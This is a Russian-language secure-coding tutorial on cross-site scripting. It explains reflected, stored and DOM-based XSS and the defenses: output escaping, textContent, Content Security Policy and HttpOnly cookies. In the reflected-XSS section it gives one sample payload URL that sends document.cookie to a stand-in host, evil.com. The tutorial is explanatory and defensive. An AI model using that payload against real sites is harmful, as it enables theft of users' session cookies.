## Что такое XSS

**XSS (Cross-Site Scripting)** — это уязвимость, при которой злоумышленник внедряет в веб-страницу вредоносный JavaScript-код, а браузер выполняет его с правами домена.

Внедрённый скрипт действует от имени пользователя и имеет полный доступ к текущему домену.

Он может прочитать `document.cookie` (без флага `HttpOnly`), украсть токен из `localStorage` или незаметно подменить интерфейс страницы.

---

## Reflected XSS (отражённая атака)

При **Reflected XSS** вредоносный скрипт приходит в самом запросе (обычно в query-параметре ссылки) и сразу отражается сервером в HTML-ответе без экранирования.

Например, злоумышленник отправляет жертве ссылку вида:

`https://bank.com/search?q=<script>fetch('https://evil.com?c='+document.cookie)</script>`

Если страница поиска подставит параметр в HTML без очистки, код `<script>` выполнится сразу после открытия ссылки.

Вредоносная нагрузка не сохраняется на сервере и срабатывает лишь тогда, когда жертва переходит по подготовленному URL.

---

## Stored XSS (сохранённая атака)

При **Stored (Persistent) XSS** вредоносный код сохраняется в базе данных сайта — например, в комментарии, профиле пользователя или заголовке тикета.

Скрипт срабатывает сам у каждого, кто откроет страницу с этой записью. Заражённая ссылка не нужна, поэтому Stored XSS наиболее опасен.

---

## DOM-based XSS и сравнение типов

При **DOM-based XSS** сервер вообще не участвует в подстановке вредоносного кода: уязвимость живёт целиком в клиентском JavaScript.

Скрипт на странице читает недоверенные данные из `location.hash`, `window.name` или параметров URL и небезопасно вставляет их в DOM через `innerHTML` или `document.write()`.

Сравнение трёх видов XSS:

| Тип XSS | Источник кода | Где возникает | Масштаб атаки |
| --- | --- | --- | --- |
| `Reflected` | Ссылка / query-параметр | Ответ сервера (HTML) | Адресно, по клику на ссылку |
| `Stored` | База данных сайта | Ответ сервера (HTML) | Все, кто открыл страницу |
| `DOM-based` | URL / `location.hash` / JS | Клиентский код (`innerHTML`) | Адресно, без участия сервера |

## Экранирование вывода и безопасный DOM (textContent)

Главный способ защиты — **контекстное экранирование вывода**.

Перед вставкой в HTML спецсимволы `&`, `<`, `>`, `"`, `'` заменяются на безопасные сущности `&amp;`, `&lt;`, `&gt;`, `&quot;`, `&#39;`.

Тогда браузер отобразит введённый тег как обычный текст и не выполнит его как скрипт. На сервере для этого применяют `markupsafe.escape` или встроенное автоэкранирование шаблонизаторов:

```python
from markupsafe import escape

raw_text = '<script>alert(1)</script>'
safe_html = escape(raw_text)
# &lt;script&gt;alert(1)&lt;/script&gt;
```

В шаблонах Django и Jinja2 вывод `{{ user_input }}` экранируется автоматически — нельзя отключать его фильтром `|safe` или `mark_safe()` для пользовательских данных.

В браузерном JavaScript вместо `element.innerHTML` и `eval()` используйте свойство `element.textContent`, которое вставляет строку строго как текст.

## Защита в глубину: Content Security Policy и HttpOnly

Даже если в шаблоне осталась ошибка экранирования, последствия атаки ограничивают два защитных заголовка на уровне браузера.

Заголовок **Content Security Policy (CSP)** задаёт белый список источников скриптов и запрещает выполнение встроенного JS прямо в HTML-тегах:

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  object-src 'none'
```

Директива `script-src 'self'` разрешает загрузку скриптов только со своего домена, а `object-src 'none'` блокирует устаревшие плагины вроде Flash и `<object>`.

Для защиты сессионных кук при выставлении используйте флаг `HttpOnly`:

```http
Set-Cookie: session=abc123; HttpOnly; Secure
```

Флаг `HttpOnly` полностью закрывает куку от чтения через `document.cookie`, так что украсть сессию с помощью XSS не получится.

> **Junior vs Senior**:
> - **Junior**: подставляет пользовательский HTML в DOM через `.innerHTML` или `|safe`, а сессионную куку оставляет доступной для чтения из `document.cookie`.
> - **Senior**: использует безопасное экранирование и `.textContent`, закрывает куки флагом `HttpOnly` и выстраивает защиту в глубину с помощью жёсткого `Content-Security-Policy`.
